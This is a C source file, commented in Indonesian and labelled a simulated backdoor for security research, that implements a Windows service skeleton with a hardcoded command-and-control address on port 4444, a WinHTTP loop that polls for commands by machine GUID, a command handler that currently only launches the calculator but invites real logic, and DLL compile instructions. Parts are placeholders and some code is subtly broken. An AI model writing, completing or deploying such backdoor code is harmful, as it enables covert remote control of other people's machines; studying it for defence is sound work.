// Kode ini adalah backdoor simulasi untuk keperluan penelitian keamanan siber.
// Disclaimer: Backdoor ini hanya untuk riset dan simulasi. Penulis tidak bertanggung jawab atas penyalahgunaan kode ini untuk tujuan ilegal.

// Kode ini mencakup:
// 1. Service Control Handler: Mengatur handler untuk mengelola status layanan.
// 2. Fungsi Utama Malware: Placeholder untuk logika utama malware.
// 3. Pembacaan Konfigurasi: Inisialisasi konfigurasi dengan nilai placeholder.
// 4. Pengambilan Perintah C2: Simulasi pengambilan perintah dari server Command and Control (C2).
// 5. Pemrosesan Perintah: Memproses perintah yang diambil (saat ini masih simulasi).
// 6. Service Loop: Loop utama yang menghubungkan ke server C2 dan memproses perintah dengan penanganan error dan pembersihan.

//manual compile: x86_64-w64-mingw32-gcc -o backdoor.dll backdoor.c -lwinhttp


#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

// Definisi flag untuk koneksi HTTPS
#define WINHTTP_FLAG_SECURE 0x00800000

// Struktur untuk menyimpan konfigurasi
typedef struct _sConfig {
    LPCWSTR lpSubKey;             // SubKey registri
    int TimeLongValue;            // Waktu tunggu lama dalam milidetik
    int TimeShortValue;           // Waktu tunggu pendek dalam milidetik
    LPCWSTR SecurityValue;        // Nilai keamanan (contoh: password default)
    LPCWSTR Hosts;                // Host C2 server
    int NumIPs;                   // Jumlah IP yang tersedia
    int HostsIndex;               // Indeks host saat ini
    LPCWSTR MachineGuidValue;     // GUID mesin
    int authenticated;            // Status autentikasi (0 atau 1)
    PROCESS_INFORMATION subprocess; // Informasi tentang subprocess yang dijalankan
} sConfig;

// Variabel global untuk status layanan
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hServiceStatus;
sConfig *config; // Variabel konfigurasi global

// Handler untuk mengelola kontrol layanan
void HandlerProc(DWORD dwControl) {
    // Handler untuk kontrol layanan seperti START, STOP, PAUSE
}

// Placeholder untuk logika utama malware
void main_malware(const char *serviceName) {
    printf("Menjalankan logika utama malware untuk layanan: %s\n", serviceName);
}

// Fungsi utama layanan
DWORD _fastcall ServiceMain(DWORD dwArgc, LPCWSTR *lpszArgv) {
    const char *serviceName = (const char *)*lpszArgv; // Nama layanan
    hServiceStatus = RegisterServiceCtrlHandlerW(*lpszArgv, HandlerProc);

    if (hServiceStatus) {
        ServiceStatus.dwCurrentState = SERVICE_RUNNING; // Set status layanan ke "berjalan"
        if (SetServiceStatus(hServiceStatus, &ServiceStatus)) {
            main_malware(serviceName); // Menjalankan logika utama malware
            ServiceStatus.dwCurrentState = SERVICE_STOPPED; // Set status layanan ke "berhenti"
            SetServiceStatus(hServiceStatus, &ServiceStatus);
        }
    }

    return (DWORD)(uintptr_t)hServiceStatus;
}

// Fungsi untuk membaca konfigurasi awal
sConfig* ReadConfig() {
    sConfig* result = (sConfig *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sConfig));
    result->Hosts = L"192.168.1.9"; // Alamat IP server C2 (dapat disesuaikan)
    result->NumIPs = 1; // Jumlah IP (default: 1)
    result->HostsIndex = 0; // Indeks awal host
    result->TimeLongValue = 30000; // Waktu tunggu lama, 30 detik
    result->TimeShortValue = 5000; // Waktu tunggu pendek, 5 detik
    result->SecurityValue = L"default_password"; // Nilai keamanan default
    result->MachineGuidValue = L"unique_machine_guid"; // GUID mesin unik
    result->authenticated = 0; // Status autentikasi awal
    ZeroMemory(&(result->subprocess), sizeof(PROCESS_INFORMATION)); // Inisialisasi subprocess
    return result;
}

// Fungsi untuk mengambil perintah dari server C2
BOOL C2_GetCommand(HINTERNET hConnect, LPCWSTR machineGuid, BYTE **responseData, DWORD *responseDataLength) {
    BOOL result = FALSE;
    HINTERNET hRequest = NULL;
    DWORD bytesRead = 0;

    WCHAR requestPath[256];
    swprintf(requestPath, 256, L"/get_command?guid=%s", machineGuid); // Path untuk mengambil perintah

    hRequest = WinHttpOpenRequest(hConnect, L"GET", requestPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    if (hRequest) {
        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
            WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpQueryDataAvailable(hRequest, responseDataLength); // Memeriksa panjang data yang tersedia

            if (*responseDataLength > 0) {
                *responseData = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *responseDataLength + 1);
                if (WinHttpReadData(hRequest, *responseData, *responseDataLength, &bytesRead)) {
                    (*responseData)[*responseDataLength] = 0; // Null-terminate data
                    result = TRUE;
                } else {
                    HeapFree(GetProcessHeap(), 0, *responseData);
                    *responseData = NULL;
                }
            }
        }
        WinHttpCloseHandle(hRequest); // Tutup handle request
    }

    return result;
}

// Fungsi untuk memproses perintah yang diterima
void ProcessCommand(sConfig *config, BYTE *commandData, DWORD commandDataLength) {
    printf("Memproses perintah: %s\n", commandData);

    // Contoh perintah sederhana: membuka kalkulator
    if (strncmp((char *)commandData, "calc", 4) == 0) {
        system("calc");
    }

    // Tambahkan logika pemrosesan perintah nyata di sini
}

// Fungsi loop layanan
void ServiceLoop() {
    HINTERNET hSession = WinHttpOpen(L"User-Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, config->Hosts, 4444, 0); // Hubungkan ke server C2

    if (!hConnect) goto SHUTDOWN;

    while (1) {
        BYTE *commandData = NULL;
        DWORD commandDataLength = 0;

        if (!C2_GetCommand(hConnect, config->MachineGuidValue, &commandData, &commandDataLength)) {
            goto SHUTDOWN; // Jika gagal, keluar dari loop
        }

        ProcessCommand(config, commandData, commandDataLength); // Memproses perintah

        if (commandData) {
            HeapFree(GetProcessHeap(), 0, commandData); // Bebaskan data perintah
        }

        Sleep(config->TimeShortValue); // Tunggu sebelum mencoba kembali
    }

SHUTDOWN:
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

// Fungsi utama program
int main() {
    LPCWSTR argv[] = {L"DummyService"}; // Nama layanan dummy
    config = ReadConfig(); // Membaca konfigurasi
    ServiceMain(1, argv); // Memulai layanan
    ServiceLoop(); // Memulai loop layanan
    return 0;
}
